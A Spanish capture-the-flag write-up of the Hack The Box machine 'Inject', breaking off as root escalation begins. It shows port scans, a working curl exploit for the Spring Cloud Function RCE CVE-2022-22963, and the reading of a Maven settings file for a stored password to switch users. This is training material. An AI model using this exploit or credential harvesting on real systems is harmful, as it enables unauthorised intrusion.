---
title: "Inject - HTB Writeup"
layout: single
excerpt: "Inject es una máquina de dificultad fácil de la plataforma de HackTheBox. Para obtener acceso inicial nos aprovechamos de un RCE en el framework Spring. Para escalar privilegios al usuario root, nos aprovechamos de una tarea cron mal configurada que ejecuta Ansible "
show_date: true
classes: wide
header:
  teaser: https://github.com/z3rObyte/z3rObyte.github.io/assets/67548295/10bfb0e2-6641-4f43-8844-337625ac3025
  teaser_home_page: true
  icon: "https://user-images.githubusercontent.com/67548295/191989683-8e498bfd-d8dd-4e45-b929-f557100f9648.png"
categories:
  - Writeup
  - HackTheBox
tags:
  - Spring
  - RCE
  - Cron
  - Ansible
---

![Inject](https://github.com/z3rObyte/z3rObyte.github.io/assets/67548295/ca713b67-3ac2-4fd7-87fb-9d1b91033622)

# Enumeración

Comenzamos la fase de enumeración con un escaneo de puertos con la herramienta **nmap**:
```bash
┌─[z3r0byte@z3r0byte]─[~/Descargas]
└──╼ $ sudo nmap -p- --open -sS --min-rate 4000 -n 10.10.11.204 -sC -sV -oN targeted 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-14 12:08 WEST
Nmap scan report for 10.10.11.204
Host is up (0.058s latency).
Not shown: 63579 closed tcp ports (reset), 1954 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 caf10c515a596277f0a80c5c7c8ddaf8 (RSA)
|   256 d51c81c97b076b1cc1b429254b52219f (ECDSA)
|_  256 db1d8ceb9472b0d3ed44b96c93a7f91d (ED25519)
8080/tcp open  nagios-nsca Nagios NSCA
|_http-title: Home
|_http-open-proxy: Proxy might be redirecting requests
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.10 seconds
```

| Parámetro | Explícación |
|:---------:|:------:|
| `-p-` | Es una forma de especificar que queremos escanear todos los puertos existentes, los 65535. |
| `--open` | Este parámetro hace que nos muestre únicamente los puertos abiertos, que nos omita los filtered. |
| `-sS` | Especificamos el tipo de escaneo 'SYN port Scan', para agilizar el escaneo ya que este valida el estado de un puerto solo con el primer paso del handshake TCP. |
| `--min-rate [valor]` | Envía paquetes tan o más rápido que la tasa dada. |
| `-n` | Quitamos la resolución DNS para que el escaneo vaya más rápido. |
| `-sC` | Utiliza un escaneo con una serie de scripts de enumeración por defecto de nmap. |
| `-sV` | Activa la detección de versiones. |
| `-oN [nombre de archivo]` | Exporta los resultados del escaneo en formato normal, tal cual se ve en el escaneo. |

Vemos que hay 2 puertos abiertos, el **8080/tcp** y el **22/tcp**.

Sabiendo esto, me puedo hacer un idea de que la vulnerabilidad a explotar estará en el puerto **8080** ya que la explotación del servicio SSH no suele ser muy común.

# User.txt

Comenzamos la enumeración del servicio alojado en el puerto 8080 suponiendo que es un servicio web usando la herramienta **whatweb** para identificar las tecnologías usadas:
```bash
┌─[z3r0byte@z3r0byte]─[~/Descargas]
└──╼ $ whatweb -a 3 -v 10.10.11.204:8080 --log-brief=whatweb.log
WhatWeb report for http://10.10.11.204:8080
Status    : 200 OK
Title     : Home
IP        : 10.10.11.204
Country   : RESERVED, ZZ

Summary   : Bootstrap, Content-Language[en-US], Frame, HTML5, YouTube

Detected Plugins:
[ Bootstrap ]
        Bootstrap is an open source toolkit for developing with 
        HTML, CSS, and JS. 

        Website     : https://getbootstrap.com/

[ Content-Language ]
        Detect the content-language setting from the HTTP header. 

        String       : en-US

[ Frame ]
        This plugin detects instances of frame and iframe HTML 
        elements. 


[ HTML5 ]
        HTML version 5, detected by the doctype declaration 


[ YouTube ]
        Embedded YouTube video 

        Website     : http://youtube.com/

HTTP Headers:
        HTTP/1.1 200 
        Content-Type: text/html;charset=UTF-8
        Content-Language: en-US
        Transfer-Encoding: chunked
        Date: Sun, 14 May 2023 11:17:29 GMT
        Connection: close

```
Parece ser que no se nos reporta nada interesante que nos llame la atención.

Siempre me gusta enumerar las aplicaciones web desde terminal antes de abrir el navegador para hacerme una idea del terreno.
Por ello procedemos a hacer una petición GET con curl para ver un poco del código fuente:

```bash
┌─[z3r0byte@z3r0byte]─[~/Descargas]                                                                                                                                                   
└──╼ $ curl 10.10.11.204:8080                                                                                                                                                                 
<!DOCTYPE html>                                                                                                                                                                              
<html lang="en">                                                                                                                                                                             
<head>                                                                                                                                                                                       
  <meta charset="UTF-8">                                                                                                                                                                     
  <title>Home</title>                                                                                                                                                                        
  <link rel="stylesheet" type="text/css" href="/webjars/bootstrap/css/bootstrap.min.css" />                                                                                                  
  <link rel="stylesheet" href="css/test.css" />                                                                                                                                              
</head>                                                                                                                                                                                      

<body>
<div id="page">
  <header id="header">
    <nav id="nav-bar" class="navbar navbar-expand-lg navbar-dark bg-dark">
      <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
        <span class="navbar-toggler-icon"></span>
  
 [...]
```
Y ya vemos algo que nos llama la atención y es la ruta donde está alojado el script de Bootstrap. La ruta /webjars/ no suele ser muy común así que la busco en google para intentar identificar el backend

![image_google](https://github.com/z3rObyte/z3rObyte.github.io/assets/67548295/7655550f-91d8-4a90-97f7-bfdbcdfb7e75)

Como podemos ver, se menciona mucho el framework de Spring asi que suponemos al 70% de que es así.
Concluyo el reconocimiento desde la terminal y abro el navegador para visitar la página:

![zodd_homepage](https://github.com/z3rObyte/z3rObyte.github.io/assets/67548295/19881ce2-545e-4167-aded-9dbb8144d7a7)

Parece ser un servicio de almacenamiento en la nube, vemos que tenemos enlaces a subpáginas en la parte superior, pero el único link que me lleva a otra parte es **Blog**

![blog](https://github.com/z3rObyte/z3rObyte.github.io/assets/67548295/ade72110-289b-4ae3-be2f-8545a03116e5)

Y parecen haber 3 artículos a los cuales no se puede entrar. Esto me da que pensar, ¿Por qué el desarrollador de la máquina habría dedicado tiempo a crear esta única subpágina si ni siquiera tiene funcionalidad?

Si leemos los resúmenes de los artículos vemos que habla mucho de cloud y menciona también cloud security. ¿Será una pista a lo que tenemos que explotar?

Visito la página oficial de Spring para ver si puedo obtener más información sobre sus funciones y me encuentro con algo que me llama la atención:

![spring_web](https://github.com/z3rObyte/z3rObyte.github.io/assets/67548295/9a2cc524-f6e3-485a-aa79-4efc2fc6a758)

Al parecer Spring cuenta con una suite de herramientas para cloud y se denomina **Spring Cloud**.

Ya que antes vimos que se hablaba de cloud security, busco en google las palabras clave **spring cloud exploit** y accedo al primer resultado que detalla la vulnerabilidad **CVE-2022-22963** la cual nos asegura un RCE.

* [Detecting and Mitigating CVE-2022-22963: Spring Cloud RCE Vulnerability](https://sysdig.com/blog/cve-2022-22963-spring-cloud/){:target="\_blank"}{:rel="noopener nofollow"}

La vulnerabilidad reside en una cabecera HTTP que permite inyectar código java malicioso para ejecutar comandos en el host.
En el artículo se nos proporciona un **PoC** para explotar la vulnerabilidad con el comando **curl**:

```bash
curl -i -s -k -X $'POST' -H $'Host: 10.10.11.204:8080' -H $'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(\"touch /tmp/test")' --data-binary $'exploit_poc' $'http://10.10.11.204:8080/functionRouter'
```
Podemos probar que este exploit funciona haciendo una petición GET con curl a nuestra IP.
Nos ponemos en escucha con netcat y vemos que recibimos una conexión desde la IP de la máquina:

![terminal](https://github.com/z3rObyte/z3rObyte.github.io/assets/67548295/2deadd46-e45e-49a8-a086-f1c6f2a07e69)

Con esto verificamos que podemos ejecutar comandos, así que el siguiente paso es obtener una shell en la máquina para trabajar más cómodos:

![2023-05-18_06-51](https://github.com/z3rObyte/z3rObyte.github.io/assets/67548295/923d4759-835c-4541-9e23-eadeb22d5da8)

---

Al no encontrar la flag user.txt en el directorio home del usuario frank, hago un reconocimiento en el sistema para ver si hay más usuarios.
Podemos ver en el archivo /etc/passwd que hay otro llamado phil:

```bash
frank@inject:/$ grep -P "1[0-9]{3}" /etc/passwd
frank:x:1000:1000:frank:/home/frank:/bin/bash
phil:x:1001:1001::/home/phil:/bin/bash
```
Tambíen me doy cuenta de un directorio oculto no común en el directorio personal del usuario frank:

![2023-05-18_07-03](https://github.com/z3rObyte/z3rObyte.github.io/assets/67548295/f2ee21be-fda1-40a1-a08f-0ad6975cfdec)

Un directorio extraño que pertenece a Maven, un software para la gestión de proyectos en Java, según Google:

![image](https://github.com/z3rObyte/z3rObyte.github.io/assets/67548295/8fc89705-dc2d-4edb-a675-924c639975a8)

Al ver lo que hay dentro nos encontramos con credenciales del usuario phil.
```bash
frank@inject:~$ ls .m2
settings.xml
frank@inject:~$ cat .m2/settings.xml 
<?xml version="1.0" encoding="UTF-8"?>
<settings xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
  <servers>
    <server>
      <id>Inject</id>
      <username>phil</username>
      <password>HIDDEN</password>
      <privateKey>${user.home}/.ssh/id_dsa</privateKey>
      <filePermissions>660</filePermissions>
      <directoryPermissions>660</directoryPermissions>
      <configuration></configuration>
    </server>
  </servers>
</settings>
```
A partir de aquí podemos iniciar sesión como este usuario y ver la flag en su directorio personal:
```bash
frank@inject:~$ su phil
Password: 
phil@inject:/home/frank$ cd
phil@inject:~$ cat user.txt 
HIDDEN
```

# Root.txt

Después de conseguir acceso como el usuario phil, volví a enumerar toda la máquina en busca de vectores de escalada de privilegios para conseguir acceso como usuario root.
Mientras enumeraba los procesos de la máquina con la herramienta [pspy](https://github.com/DominicBreuker/pspy){:target="\_blank"}{:rel="noopener nofollow"}
